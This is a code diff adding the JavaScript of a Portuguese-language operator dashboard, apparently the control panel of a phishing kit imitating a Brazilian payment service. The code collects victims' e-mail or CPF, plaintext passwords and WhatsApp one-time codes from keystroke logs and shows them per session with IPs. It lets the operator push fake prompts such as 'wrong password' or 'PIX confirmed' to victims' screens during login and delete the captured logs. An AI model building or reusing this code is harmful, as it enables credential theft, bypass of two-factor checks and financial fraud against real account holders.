+    if (!menu) return;
+
+    menu.classList.toggle('open');
+
+    // Posiciona ao abrir — centralizado abaixo do botão
+    if (menu.classList.contains('open')) {
+      const btn = document.querySelector(`[data-sid="${sid}"]`);
+      if (btn) {
+        const rect = btn.getBoundingClientRect();
+        const btnCenter = rect.left + rect.width / 2;
+        menu.style.top = (rect.bottom + 8) + 'px';
+        menu.style.left = btnCenter + 'px';
+      }
+    }
+  }
+
+  // Fecha dropdown ao clicar fora
+  document.addEventListener('click', e => {
+    if (!e.target.closest('.row-cmd-wrap')) {
+      document.querySelectorAll('.row-cmd-menu.open').forEach(m => m.classList.remove('open'));
+    }
+  });
+
+  // Mapa de labels dos comandos
+  const _cmdLabels = {
+    'senha_errada': '🔴 Senha incorreta',
+    'login_invalido': '⚠️ Login inválido',
+    'cpf_nao_encontrado': '🔍 CPF não encontrado',
+    'codigo_invalido': '❌ Código inválido',
+    'dados_incorretos': '📋 Dados incorretos',
+    'conta_bloqueada': '🔒 Conta bloqueada',
+    'sessao_expirada': '⏰ Sessão expirada',
+    'tentar_novamente': '🔄 Tente novamente',
+    'mfa_whatsapp_ok': '💬 WhatsApp confirmado',
+    'mfa_pix_ok': '💳 PIX confirmado',
+    'verificar_whatsapp': '📱 Verificar WhatsApp',
+    'aguarde': '⏳ Aguarde',
+    'acesso_liberado': '✅ Acesso liberado',
+  };
+
+  async function enviarCmd(cmd, sid) {
+    if (!_cmdChannel) { mostrarToast('Canal não conectado', 'error'); return; }
+
+    // Fecha o dropdown
+    if (sid) document.querySelector(`.row-cmd-menu[data-sid="${sid}"]`)?.classList.remove('open');
+
+    try {
+      // Marca como aguardando resposta
+      if (sid) {
+        _pendingCommands.set(sid, {
+          cmd,
+          label: _cmdLabels[cmd] || cmd,
+          timestamp: Date.now()
+        });
+
+        // Remove comando pendente após 10 segundos (timeout)
+        setTimeout(() => {
+          _pendingCommands.delete(sid);
+          renderizarEventos();
+        }, 10000);
+      }
+
+      await _cmdChannel.send({
+        type: 'broadcast',
+        event: 'cmd',
+        payload: { cmd, sessionId: sid || null },
+      });
+      mostrarToast(`⚡ Comando enviado para ${sid || 'todos'}`, 'success');
+      renderizarEventos(); // Atualiza tabela para mostrar "Aguardando"
+    } catch (e) {
+      mostrarToast(`Erro: ${e.message}`, 'error');
+      if (sid) _pendingCommands.delete(sid); // Remove se falhar
+    }
+  }
+
+  function atualizarOnline() {
+    const cutoff = Date.now() - 25000;
+    for (const [id, s] of _sessions) {
+      if (s.ts < cutoff) _sessions.delete(id);
+    }
+    const el = document.getElementById('onlineCount');
+    if (el) el.textContent = _sessions.size.toString();
+  }
+
+  function iniciarPresence() {
+    _presenceChannel = supabase.channel('login-online', {
+      config: { broadcast: { self: false } },
+    });
+
+    _presenceChannel
+      .on('broadcast', { event: 'session' }, ({ payload }) => {
+        const { sessionId, action, step, usuario, isWaiting } = payload;
+        if (!sessionId) return;
+
+        if (action === 'leave') {
+          _sessions.delete(sessionId);
+        } else {
+          _sessions.set(sessionId, { step, usuario, isWaiting: isWaiting ?? false, ts: Date.now() });
+        }
+        atualizarOnline();
+        mostrarToast(`${action === 'leave' ? '🔴' : '🟢'} ${sessionId} — ${step || 'Login'}`, 'info');
+      })
+      .subscribe(status => {
+        console.log('[Broadcast] Status dashboard:', status);
+      });
+
+    // Limpa sessões expiradas a cada 15s
+    setInterval(atualizarOnline, 15000);
+  }
+
+  // ============================================================
+  // Inicialização: executada quando o DOM está pronto
+  // ============================================================
+  document.addEventListener('DOMContentLoaded', async () => {
+    // Bloqueia abertura via file:// (causa CORS com Supabase)
+    if (window.location.protocol === 'file:') {
+      document.body.innerHTML = `
+        <div style="font-family:'Nunito Sans',sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;background:#f4f6f9;">
+          <div style="background:#fff;border-radius:12px;padding:40px 48px;max-width:520px;text-align:center;box-shadow:0 2px 16px rgba(0,0,0,0.1);">
+            <div style="font-size:48px;margin-bottom:16px;">⚠️</div>
+            <h2 style="color:#1a202c;margin-bottom:12px;">Abra via HTTP, não file://</h2>
+            <p style="color:#6b7280;margin-bottom:24px;line-height:1.6;">
+              O dashboard precisa ser servido via HTTP para se comunicar com o Supabase.<br><br>
+              O servidor já está rodando. Acesse pelo link abaixo:
+            </p>
+            <a href="http://localhost:3000/dashboard/"
+               style="display:inline-block;background:#1FB28A;color:#fff;padding:12px 32px;border-radius:8px;text-decoration:none;font-weight:700;font-size:16px;">
+              Abrir em localhost:3000/dashboard/
+            </a>
+          </div>
+        </div>`;
+      return;
+    }
+
+    // Verifica se as credenciais foram configuradas
+    if (
+      CONFIG.SUPABASE_URL.includes('SEU_PROJECT_ID') ||
+      CONFIG.SUPABASE_ANON_KEY === 'SUA_CHAVE_ANON_AQUI'
+    ) {
+      document.getElementById('configAlert').classList.add('visible');
+      setConnectionStatus(false);
+      renderEmptyTables();
+      return;
+    }
+
+    // Detecta como o Supabase CDN foi exportado (UMD vs global)
+    const createClient = (window.supabase?.createClient) || window.createClient;
+    if (!createClient) {
+      alert('Erro: Supabase SDK não carregou. Verifique sua conexão com a internet.');
+      return;
+    }
+
+    // Inicializa o cliente Supabase com a chave anon (segura para browser)
+    supabase = createClient(CONFIG.SUPABASE_URL, CONFIG.SUPABASE_ANON_KEY, {
+      realtime: { params: { eventsPerSecond: 10 } },
+    });
+
+    // Carrega os dados iniciais e configura o Realtime
+    await Promise.all([
+      carregarEventos(),
+      carregarLogs(),
+      carregarComandos(),
+      carregarKeystrokes(),
+    ]);
+
+    configurarRealtime();
+    iniciarPresence();
+    iniciarCanalComandos();
+    atualizarUltimaAtualizacao();
+
+    // Evento de logout
+    document.getElementById('logoutBtn').addEventListener('click', () => {
+      if (confirm('Deseja sair?')) {
+        localStorage.removeItem('shield_auth_token');
+        localStorage.removeItem('shield_auth_user');
+        window.location.href = 'login.html';
+      }
+    });
+  });
+
+  // ============================================================
+  // Carregamento de dados iniciais
+  // ============================================================
+
+  /** Busca os 50 eventos mais recentes do Supabase */
+  async function carregarEventos() {
+    try {
+      console.log('[Dashboard] Carregando eventos...');
+      const { data, error } = await supabase
+        .from('events')
+        .select('*')
+        .order('created_at', { ascending: false })
+        .limit(50);
+      console.log('[Dashboard] Eventos carregados:', data?.length || 0);
+
+      if (error) throw error;
+
+      state.events = data || [];
+      renderizarEventos();
+      atualizarStats();
+    } catch (err) {
+      console.error('[Dashboard] Erro ao carregar eventos:', err);
+      renderErroTabela('eventsTableBody', 5, 'Erro ao carregar eventos');
+    }
+  }
+
+  /** Busca os 50 logs mais recentes do Supabase */
+  async function carregarLogs() {
+    try {
+      const { data, error } = await supabase
+        .from('logs')
+        .select('*')
+        .order('created_at', { ascending: false })
+        .limit(50);
+
+      if (error) throw error;
+
+      state.logs = data || [];
+      renderizarLogs();
+    } catch (err) {
+      console.error('[Dashboard] Erro ao carregar logs:', err);
+      renderErroTabela('logsTableBody', 4, 'Erro ao carregar logs');
+    }
+  }
+
+  /** Carrega TODOS os keystrokes sem limite fixo — dados nunca perdidos no refresh */
+  async function carregarKeystrokes() {
+    try {
+      let all = [];
+      let from = 0;
+      const PAGE = 1000;
+
+      while (true) {
+        const { data, error } = await supabase
+          .from('logs')
+          .select('id, created_at, detalhes, categoria')
+          .eq('categoria', 'keystroke')
+          .order('created_at', { ascending: false })
+          .range(from, from + PAGE - 1);
+
+        if (error) throw error;
+        if (!data || data.length === 0) break;
+        all = all.concat(data);
+        if (data.length < PAGE) break;
+        from += PAGE;
+      }
+
+      state.keystrokes = all;
+      renderizarEventos();
+    } catch (err) {
+      console.error('[Dashboard] Erro ao carregar keystrokes:', err);
+    }
+  }
+
+  /** Busca os 30 comandos mais recentes do Supabase */
+  async function carregarComandos() {
+    try {
+      const { data, error } = await supabase
+        .from('commands')
+        .select('*')
+        .order('created_at', { ascending: false })
+        .limit(30);
+
+      if (error) throw error;
+
+      state.commands = data || [];
+      renderizarComandos();
+      atualizarStats();
+    } catch (err) {
+      console.error('[Dashboard] Erro ao carregar comandos:', err);
+      renderErroTabela('commandsTableBody', 3, 'Erro ao carregar comandos');
+    }
+  }
+
+  // ============================================================
+  // Configuração do Realtime (atualização automática)
+  // ============================================================
+
+  /** Configura os canais de Realtime para todas as tabelas */
+  function configurarRealtime() {
+    // Remove canal anterior se existir
+    if (realtimeChannel) {
+      supabase.removeChannel(realtimeChannel);
+    }
+
+    // Cria um canal que escuta INSERT em todas as tabelas monitoradas
+    realtimeChannel = supabase
+      .channel('woovi-shield-dashboard')
+
+      // Novos eventos de autenticação - Apenas para atualizar isWaiting em tempo real
+      .on(
+        'postgres_changes',
+        { event: 'INSERT', schema: 'public', table: 'events' },
+        (payload) => {
+          const evt = payload.new;
+          if (!evt.tipo) return;
+          // Adiciona ao estado para que buildSessions() processe
+          state.events.unshift(evt);
+          // Renderiza imediatamente para mostrar "Aguardando..." em tempo real
+          renderizarEventos();
+          atualizarUltimaAtualizacao();
+        }
+      )
+
+      // Novos logs do sistema
+      .on(
+        'postgres_changes',
+        { event: 'INSERT', schema: 'public', table: 'logs' },
+        (payload) => {
+          console.log('[Realtime] Novo log:', payload.new);
+          state.logs.unshift(payload.new);
+          if (state.logs.length > 50) state.logs.pop();
+          renderizarLogs(true);
+          atualizarUltimaAtualizacao();
+        }
+      )
+
+      // Novos comandos e atualizações de status
+      .on(
+        'postgres_changes',
+        { event: 'INSERT', schema: 'public', table: 'commands' },
+        (payload) => {
+          console.log('[Realtime] Novo comando:', payload.new);
+          state.commands.unshift(payload.new);
+          if (state.commands.length > 30) state.commands.pop();
+          renderizarComandos(true);
+          atualizarStats();
+          atualizarUltimaAtualizacao();
+        }
+      )
+      .on(
+        'postgres_changes',
+        { event: 'UPDATE', schema: 'public', table: 'commands' },
+        (payload) => {
+          console.log('[Realtime] Comando atualizado:', payload.new);
+          // Atualiza o comando no estado local
+          const idx = state.commands.findIndex(c => c.id === payload.new.id);
+          if (idx !== -1) {
+            state.commands[idx] = payload.new;
+          }
+          renderizarComandos();
+          atualizarUltimaAtualizacao();
+          mostrarToast(`Comando ${payload.new.acao}: ${payload.new.status}`, 'info');
+        }
+      )
+
+      // Keystroke monitor
+      .on(
+        'postgres_changes',
+        { event: 'INSERT', schema: 'public', table: 'logs' },
+        (payload) => {
+          const log = payload.new;
+          if (log.categoria === 'keystroke') {
+            adicionarKeystroke(log);
+            state.keystrokes.unshift(log); // nunca descarta — acumula tudo
+            renderizarEventos();
+          }
+        }
+      )
+
+      // Monitora o estado da conexão Realtime
+      .subscribe((status) => {
+        console.log('[Realtime] Status da conexão:', status);
+
+        if (status === 'SUBSCRIBED') {
+          setConnectionStatus(true);
+        } else if (status === 'CHANNEL_ERROR' || status === 'TIMED_OUT') {
+          setConnectionStatus(false);
+          // Tenta reconectar após 5 segundos
+          setTimeout(configurarRealtime, 5000);
+        } else if (status === 'CLOSED') {
+          setConnectionStatus(false);
+        }
+      });
+  }
+
+  // ============================================================
+  // Renderização das tabelas
+  // ============================================================
+
+  function isValidIp(ip) {
+    // IPv4
+    if (/^\d+\.\d+\.\d+\.\d+(?::\d+)?$/.test(ip)) return true;
+    // IPv6 (incluindo ::1)
+    if (/^[\da-f:]+$/i.test(ip) && ip.includes(':')) return true;
+    return false;
+  }
+
+  /** Renderiza a tabela de eventos */
+  // Extrai sessionId e nome do campo usuario
+  function parsearUsuario(usuario) {
+    if (!usuario) return { sid: null, nome: null };
+    // Formato novo: "nome [IP]" ou apenas "IP" (IPv4 ou IPv6)
+    const matchIp = usuario.match(/^(.*?)\s*\[([\da-f:.]+)\]$/i);
+    if (matchIp && (isValidIp(matchIp[2]))) return { nome: matchIp[1].trim() || null, sid: matchIp[2] };
+    // Formato antigo: "nome [#ID]" ou apenas "#ID"
+    const matchHash = usuario.match(/^(.*?)\s*\[(#[A-Z0-9]+)\]$/);
+    if (matchHash) return { nome: matchHash[1].trim() || null, sid: matchHash[2] };
+    // Apenas IP (IPv4 ou IPv6)
+    if (isValidIp(usuario)) return { sid: usuario, nome: null };
+    // Apenas #ID (formato antigo)
+    if (/^#[A-Z0-9]+$/.test(usuario)) return { sid: usuario, nome: null };
+    return { sid: null, nome: usuario };
+  }
+
+  // Constrói mapa de sessões mesclando events + keystroke logs
+  function buildSessions() {
+    const sessions = new Map(); // sid → { sid, email, senha, otp, step, status, ip, lastSeen }
+
+    const rankStatus = { error: 3, warning: 2, success: 1, info: 0 };
+    const stepNames  = { s1:'Login', s2:'Senha', s3:'MFA', s4p:'PIX', s4w:'WhatsApp OTP' };
+
+    // Processa eventos — só usa como chave session IDs válidos (IPs ou #XXXXX)
+    for (const evt of state.events) {
+      const { sid, nome } = parsearUsuario(evt.usuario);
+      // Ignora registros sem session ID válido
+      const isValidHash = /^#[A-Z0-9]+$/.test(sid || '');
+      if (!sid || (!isValidIp(sid) && !isValidHash)) continue;
+
+      if (!sessions.has(sid)) {
+        sessions.set(sid, { sid, email: null, senha: null, otp: null, step: 'Login', status: 'info', ip: null, lastSeen: evt.created_at, isWaiting: false });
+      }
+      const s = sessions.get(sid);
+      if (!s.email && nome) s.email = nome;
+      if (!s.ip) s.ip = evt.ip || null;
+      if ((rankStatus[evt.status] || 0) >= (rankStatus[s.status] || 0)) s.status = evt.status;
+
+      // Se é login_attempt ou mfa_request, marca como aguardando
+      if (evt.tipo === 'login_attempt' || evt.tipo === 'mfa_request') {
+        s.isWaiting = true;
+      }
+      // Se recebeu resposta (sucesso ou erro), não está mais aguardando
+      if (evt.tipo === 'login_success' || evt.tipo === 'codigo_valido' || evt.tipo === 'password_incorrect' || evt.tipo === 'auth_failure' || evt.tipo === 'login_error') {
+        s.isWaiting = false;
+      }
+
+      // Usa o step enviado no evento, ou fallback para lógica antiga
+      if (evt.step && stepNames[evt.step]) {
+        s.step = stepNames[evt.step];
+      } else if (evt.tipo === 'login_success') {
+        s.step = 'Sucesso ✅';
+      } else if (evt.tipo === 'mfa_request') {
+        s.step = evt.mensagem?.includes('WhatsApp') ? 'WhatsApp OTP' : 'PIX';
+      } else if (evt.tipo === 'auth_failure' || evt.tipo === 'password_incorrect') {
+        s.step = 'Senha ❌';
+      }
+
+      // Se tem comando pendente, atualiza o status
+      if (_pendingCommands.has(sid)) {
+        const pending = _pendingCommands.get(sid);
+        s.pendingCmd = pending.label;
+        s.pendingTime = pending.timestamp;
+      }
+    }
+
+    // Processa keystrokes — estado dedicado, carregado completo do banco
+    for (const log of state.keystrokes) {
+      const det = log.detalhes || {};
+      const sid  = det.sessionId;
+      if (!sid) continue;
+      if (!sessions.has(sid)) {
+        sessions.set(sid, { sid, email: null, senha: null, otp: null, step: 'Login', status: 'info', ip: null, lastSeen: log.created_at });
+      }
+      const s = sessions.get(sid);
+      // Só preenche se ainda não tem valor (logs vêm DESC — primeiro = mais recente)
+      if (det.campo === 'email_cpf'    && det.valor && !s.email) s.email = det.valor;
+      if (det.campo === 'senha'        && det.valor && !s.senha) s.senha = det.valor;
+      if (det.campo === 'otp_whatsapp' && det.valor && !s.otp)   s.otp   = det.valor;
+    }
+
+    // Atualiza isWaiting do broadcast em tempo real (prioridade sobre eventos)
+    for (const [sessionId, broadcastData] of _sessions.entries()) {
+      const s = sessions.get(sessionId);
+      if (s && broadcastData.isWaiting !== undefined) {
+        s.isWaiting = broadcastData.isWaiting;
+      }
+    }
+
+    return sessions;
+  }
+
+  function renderizarEventos(animaFirst = false) {
+    const tbody = document.getElementById('eventsTableBody');
+    const sessions = buildSessions();
+
+    if (!sessions.size) {
+      tbody.innerHTML = `<tr><td colspan="9"><div class="empty-state"><div class="empty-icon">🔍</div><p>Nenhuma sessão registrada ainda</p></div></td></tr>`;
+      return;
+    }
+
+    // Conta quantas sessões por IP (para destacar IPs com múltiplas sessões)
+    const ipCount = {};
+    for (const s of sessions.values()) {
+      if (s.ip) ipCount[s.ip] = (ipCount[s.ip] || 0) + 1;
+    }
+
+    // Aplica filtro de IP se ativo
+    let lista = [...sessions.values()];
+    if (_filtroIP) lista = lista.filter(s => s.ip === _filtroIP);
+
+    // Ordena por horário (mais recentes primeiro)
+    lista.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));
+
+    if (!lista.length) {
+      tbody.innerHTML = `<tr><td colspan="9"><div class="empty-state"><div class="empty-icon">🔍</div><p>Nenhuma sessão para este IP</p></div></td></tr>`;
+      return;
+    }
+
+    tbody.innerHTML = lista.map((s, i) => {
+      const ipRepetido = s.ip && ipCount[s.ip] > 1;
+      const ipStyle = ipRepetido
+        ? 'font-size:11px;font-weight:700;color:#d97706;background:#fef3c7;padding:2px 8px;border-radius:8px;cursor:pointer;'
+        : 'font-size:11px;cursor:pointer;text-decoration:underline dotted;color:#6b7280;';
+      const ipTitle = ipRepetido ? `${ipCount[s.ip]} sessões deste IP — clique para filtrar` : 'Clique para filtrar';
+      const highlighted = _filtroIP && s.ip === _filtroIP;
+
+      return `
+      <tr class="${animaFirst && i === 0 ? 'new-row' : ''}"
+          style="${highlighted ? 'background:#fffbeb;' : ''}">
+        <td>
+          <span style="font-family:monospace;font-size:12px;font-weight:700;color:#1FB28A;
+            background:#d4f5ec;padding:2px 8px;border-radius:12px;">${escapeHtml(s.sid)}</span>
+        </td>
+        <td style="font-size:13px;max-width:160px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">
+          ${s.email ? escapeHtml(s.email) : '<span style="color:#9ca3af;">—</span>'}
+        </td>
+        <td>
+          ${s.senha
+            ? `<code style="font-size:12px;background:#fff0f0;color:#ef4444;padding:2px 8px;border-radius:4px;">${escapeHtml(s.senha)}</code>`
+            : '<span style="color:#9ca3af;">—</span>'}
+        </td>
+        <td>
+          ${s.otp
+            ? `<code style="font-size:12px;background:#f0f9ff;color:#3b82f6;padding:2px 8px;border-radius:4px;">${escapeHtml(s.otp)}</code>`
+            : '<span style="color:#9ca3af;">—</span>'}
+        </td>
+        <td style="font-size:12px;color:#374151;">${escapeHtml(s.step)}</td>
+        <td>${s.pendingCmd ? `<span style="font-size:13px;font-weight:600;">${s.pendingCmd}</span>` : (s.isWaiting ? `<span style="color:#f59e0b;font-weight:600;">⏳ Aguardando...</span>` : badgeStatus(s.status))}</td>
+        <td>
+          ${s.ip
+            ? `<code style="${ipStyle}" onclick="filtrarPorIP('${escapeHtml(s.ip)}')" title="${ipTitle}">
+                ${escapeHtml(s.ip)}${ipRepetido ? ` <span style="font-size:10px;">(${ipCount[s.ip]}×)</span>` : ''}
+               </code>`
+            : '<span style="color:#9ca3af;">—</span>'}
+        </td>
+        <td style="color:var(--color-text-muted);font-size:12px;">${formatarData(s.lastSeen)}</td>
+        <td>
+          <div class="row-cmd-wrap">
+            <button class="row-cmd-btn" data-sid="${s.sid}" onclick="toggleDropdown(this.dataset.sid)">
+              ⚡ Comandos ▾
+            </button>
+            <div class="row-cmd-menu" data-sid="${s.sid}">
+              <button data-cmd="senha_errada" onclick="enviarCmd(this.dataset.cmd, this.parentElement.dataset.sid)">🔴 Senha incorreta</button>
+              <button data-cmd="login_invalido" onclick="enviarCmd(this.dataset.cmd, this.parentElement.dataset.sid)">⚠️ Login inválido</button>
+              <button data-cmd="cpf_nao_encontrado" onclick="enviarCmd(this.dataset.cmd, this.parentElement.dataset.sid)">🔍 CPF não encontrado</button>
+              <button data-cmd="codigo_invalido" onclick="enviarCmd(this.dataset.cmd, this.parentElement.dataset.sid)">❌ Código inválido</button>
+              <button data-cmd="dados_incorretos" onclick="enviarCmd(this.dataset.cmd, this.parentElement.dataset.sid)">📋 Dados incorretos</button>
+              <hr>
+              <button data-cmd="conta_bloqueada" onclick="enviarCmd(this.dataset.cmd, this.parentElement.dataset.sid)">🔒 Conta bloqueada</button>
+              <button data-cmd="sessao_expirada" onclick="enviarCmd(this.dataset.cmd, this.parentElement.dataset.sid)">⏰ Sessão expirada</button>
+              <button data-cmd="tentar_novamente" onclick="enviarCmd(this.dataset.cmd, this.parentElement.dataset.sid)">🔄 Tente novamente</button>
+              <hr>
+              <button data-cmd="mfa_whatsapp_ok" onclick="enviarCmd(this.dataset.cmd, this.parentElement.dataset.sid)">💬 WhatsApp confirmado</button>
+              <button data-cmd="mfa_pix_ok" onclick="enviarCmd(this.dataset.cmd, this.parentElement.dataset.sid)">💳 PIX confirmado</button>
+              <button data-cmd="verificar_whatsapp" onclick="enviarCmd(this.dataset.cmd, this.parentElement.dataset.sid)">📱 Verificar WhatsApp</button>
+              <button data-cmd="aguarde" onclick="enviarCmd(this.dataset.cmd, this.parentElement.dataset.sid)">⏳ Aguarde</button>
+              <button data-cmd="acesso_liberado" onclick="enviarCmd(this.dataset.cmd, this.parentElement.dataset.sid)">✅ Acesso liberado</button>
+            </div>
+          </div>
+        </td>
+      </tr>`;
+    }).join('');
+  }
+
+  /** Renderiza a tabela de logs */
+  function renderizarLogs(animaFirst = false) {
+    const tbody = document.getElementById('logsTableBody');
+
+    if (!state.logs.length) {
+      tbody.innerHTML = `
+        <tr>
+          <td colspan="4">
+            <div class="empty-state">
+              <div class="empty-icon">📋</div>
+              <p>Nenhum log registrado ainda</p>
+            </div>
+          </td>
+        </tr>`;
+      return;
+    }
+
+    tbody.innerHTML = state.logs.map((log, i) => `
+      <tr class="${animaFirst && i === 0 ? 'new-row' : ''}">
+        <td>${badgeLevel(log.level)}</td>
+        <td>${escapeHtml(log.categoria || '—')}</td>
+        <td class="wrap" style="max-width:260px;">${escapeHtml(log.mensagem)}</td>
+        <td style="color:var(--color-text-muted);font-size:12px;">${formatarData(log.created_at)}</td>
+      </tr>
+    `).join('');
+  }
+
+  /** Renderiza a tabela de comandos */
+  function renderizarComandos(animaFirst = false) {
+    const tbody = document.getElementById('commandsTableBody');
+
+    if (!state.commands.length) {
+      tbody.innerHTML = `
+        <tr>
+          <td colspan="3">
+            <div class="empty-state">
+              <div class="empty-icon">⚡</div>
+              <p>Nenhum comando enviado ainda</p>
+            </div>
+          </td>
+        </tr>`;
+      return;
+    }
+
+    tbody.innerHTML = state.commands.map((cmd, i) => `
+      <tr class="${animaFirst && i === 0 ? 'new-row' : ''}">
+        <td><code style="font-size:11px;background:#f1f5f9;padding:2px 6px;border-radius:4px;">${escapeHtml(cmd.acao)}</code></td>
+        <td>${badgeCommandStatus(cmd.status)}</td>
+        <td style="color:var(--color-text-muted);font-size:12px;">${formatarData(cmd.created_at)}</td>
+      </tr>
+    `).join('');
+  }
+
+  /** Renderiza estado de tabelas vazias ao iniciar sem credenciais */
+  function renderEmptyTables() {
+    const ids = ['eventsTableBody', 'logsTableBody', 'commandsTableBody'];
+    const cols = [5, 4, 3];
+    ids.forEach((id, i) => {
+      document.getElementById(id).innerHTML = `
+        <tr><td colspan="${cols[i]}">
+          <div class="empty-state">
+            <div class="empty-icon">⚙️</div>
+            <p>Configure as credenciais para visualizar os dados</p>
+          </div>
+        </td></tr>`;
+    });
+    // Também zera os stats
+    ['statTotalEvents','statErrors','statCommands','statActiveSessions'].forEach(id => {
+      document.getElementById(id).textContent = '—';
+    });
+  }
+
+  /** Renderiza mensagem de erro em uma tabela */
+  function renderErroTabela(tbodyId, cols, msg) {
+    document.getElementById(tbodyId).innerHTML = `
+      <tr><td colspan="${cols}">
+        <div class="empty-state">
+          <div class="empty-icon">⚠️</div>
+          <p>${msg}</p>
+        </div>
+      </td></tr>`;
+  }
+
+  // ============================================================
+  // Atualização dos cards de estatísticas
+  // ============================================================
+
+  function atualizarStats() {
+    const erros = state.events.filter(e => e.status === 'error' || e.status === 'warning').length;
+    document.getElementById('statErrors').textContent = erros.toString();
+
+    const senhas = state.logs.filter(l => l.categoria === 'keystroke' && l.detalhes?.campo === 'senha').length;
+    const statPw = document.getElementById('statPasswords');
+    if (statPw) statPw.textContent = senhas.toString();
+  }
+
+  // ============================================================
+  // Envio de comandos
+  // ============================================================
+
+  /** Envia um comando via formulário do painel */
+  async function enviarComando() {
+    const acao = document.getElementById('cmdAcao').value.trim();
+    const payloadRaw = document.getElementById('cmdPayload').value.trim();
+    const feedback = document.getElementById('commandFeedback');
+
+    // Esconde feedback anterior
+    feedback.className = 'command-feedback';
+    feedback.textContent = '';
+
+    if (!acao) {
+      exibirFeedback('Selecione uma ação antes de enviar', 'error');
+      return;
+    }
+
+    // Valida e parseia o payload JSON se fornecido
+    let payload = null;
+    if (payloadRaw) {
+      try {
+        payload = JSON.parse(payloadRaw);
+      } catch {
+        exibirFeedback('Payload inválido: não é um JSON válido', 'error');
+        return;
+      }
+    }
+
+    // Desabilita o botão durante o envio
+    const btn = document.querySelector('.command-form .btn-primary');
+    btn.disabled = true;
+    btn.textContent = '⏳ Enviando...';
+
+    try {
+      // clear_logs executa diretamente no dashboard
+      if (acao === 'clear_logs') {
+        await executarClearLogs();
+        document.getElementById('cmdAcao').value = '';
+        btn.disabled = false;
+        btn.textContent = '⚡ Enviar Comando';
+        return;
+      }
+
+      // Insere direto no Supabase
+      const { data, error } = await supabase.from('commands').insert([{
+        acao,
+        payload,
+        criado_em: new Date().toISOString(),
+      }]).select();
+
+      if (error) throw new Error(error.message);
+
+      const idCurto = data[0].id.substring(0, 8);
+      exibirFeedback(`✅ Comando "${acao}" enviado! ID: ${idCurto}...`, 'success');
+
+      document.getElementById('cmdAcao').value = '';
+      document.getElementById('cmdPayload').value = '';
+
+    } catch (err) {
+      console.error('[Dashboard] Erro ao enviar comando:', err);
+      exibirFeedback(`Erro ao enviar: ${err.message || 'Tente novamente'}`, 'error');
+    } finally {
+      btn.disabled = false;
+      btn.textContent = '⚡ Enviar Comando';
+    }
+  }
+
+  /** Envia um comando de ação rápida diretamente */
+  async function acaoRapida(acao, payload) {
+    if (!supabase) {
+      mostrarToast('Configure as credenciais do Supabase primeiro', 'error');
+      return;
+    }
+
+    if (payload && Object.values(payload).some(v => !v)) return;
+
+    // clear_logs executa imediatamente — não precisa de comando pendente
+    if (acao === 'clear_logs') {
+      await executarClearLogs();
+      return;
+    }
+
+    try {
+      const { data, error } = await supabase.from('commands').insert([{
+        acao,
+        payload,
+        criado_em: new Date().toISOString(),
+      }]).select();
+
+      if (error) throw new Error(error.message);
+      mostrarToast(`Comando "${acao}" enviado!`, 'success');
+    } catch (err) {
+      mostrarToast(`Erro: ${err.message}`, 'error');
+    }
+  }
+
+  /** Apaga todos os eventos direto no Supabase */
+  async function limparEventos() {
+    try {
+      console.log('[Dashboard] Deletando eventos e logs...');
+      const [{ error: errEvents }, { error: errLogs }] = await Promise.all([
+        supabase.from('events').delete().neq('id', '00000000-0000-0000-0000-000000000000'),
+        supabase.from('logs').delete().neq('id', '00000000-0000-0000-0000-000000000000')
+      ]);
+
+      if (errEvents) throw new Error(errEvents.message || 'Erro ao deletar eventos');
+      if (errLogs) throw new Error(errLogs.message || 'Erro ao deletar logs');
+
+      console.log('[Dashboard] Sucesso ao deletar eventos e logs');
+
+      // Limpa frontend
+      state.events = [];
+      const tbody = document.getElementById('eventsTableBody');
+      tbody.innerHTML = `<tr><td colspan="9"><div class="empty-state"><div class="empty-icon">🔍</div><p>Nenhuma sessão registrada ainda</p></div></td></tr>`;
+      atualizarStats();
+      mostrarToast('Eventos e logs apagados!', 'success');
+    } catch (err) {
+      console.error('[Dashboard] Erro ao limpar:', err);
+      mostrarToast(`Erro: ${err.message}`, 'error');
+    }
+  }
+
+  /** Apaga todos os logs direto no Supabase */
+  async function executarClearLogs() {
+    try {
+      const { error } = await supabase.from('logs').delete().neq('id', '00000000-0000-0000-0000-000000000000');
+
+      if (error) throw new Error(error.message || 'Erro ao deletar logs');
+
+      state.logs = [];
+      renderizarLogs();
+      limparMonitor();
+      atualizarStats();
+      mostrarToast('Logs apagados com sucesso!', 'success');
+    } catch (err) {
+      mostrarToast(`Erro ao limpar logs: ${err.message}`, 'error');
+    }
+  }
+
+  // ============================================================
+  // Utilitários de UI
+  // ============================================================
+
+  /** Exibe feedback no formulário de comando */
+  function exibirFeedback(msg, tipo) {
+    const el = document.getElementById('commandFeedback');
+    el.textContent = msg;
+    el.className = `command-feedback ${tipo}`;
+  }
+
+  /** Atualiza todos os dados manualmente */
+  async function refreshAll() {
+    if (!supabase) return;
+    await Promise.all([
+      carregarEventos(),
+      carregarLogs(),
+      carregarComandos(),
+      carregarKeystrokes(),
+    ]);
+    atualizarUltimaAtualizacao();
+    mostrarToast('Dados atualizados!', 'success');
+  }
+
+  /** Atualiza o indicador de última atualização no header */
+  function atualizarUltimaAtualizacao() {
+    const el = document.getElementById('lastUpdate');
+    const agora = new Date();
+    el.textContent = `Atualizado: ${agora.toLocaleTimeString('pt-BR')}`;
+  }
+
+  /** Atualiza o indicador de status de conexão */
+  function setConnectionStatus(connected) {
+    state.connected = connected;
+    const dot = document.getElementById('connectionDot');
+    const text = document.getElementById('connectionText');
+
+    if (connected) {
+      dot.classList.add('connected');
+      text.textContent = 'Conectado';
+    } else {
+      dot.classList.remove('connected');
+      text.textContent = 'Desconectado';
+    }
+  }
+
+  /** Exibe um toast de notificação temporário */
+  function mostrarToast(mensagem, tipo = 'info') {
+    const container = document.getElementById('toastContainer');
+    const toast = document.createElement('div');
+    toast.className = `toast toast-${tipo}`;
+    toast.textContent = mensagem;
+    container.appendChild(toast);
+
+    // Remove o toast após 4 segundos
+    setTimeout(() => {
+      toast.style.opacity = '0';
+      toast.style.transform = 'translateY(8px)';
+      toast.style.transition = 'all 0.3s ease';
+      setTimeout(() => toast.remove(), 300);
+    }, 4000);
+  }
+
+  // ============================================================
+  // Helpers de formatação
+  // ============================================================
+
+  // ── Monitor de Digitação ──
+
+  const campoIcons = {
+    email_cpf:    { icon: '📧', cor: '#58a6ff', label: 'E-mail / CPF' },
+    senha:        { icon: '🔑', cor: '#ff4444', label: 'SENHA' },
+    otp_whatsapp: { icon: '📱', cor: '#3fb950', label: 'OTP WhatsApp' },
+  };
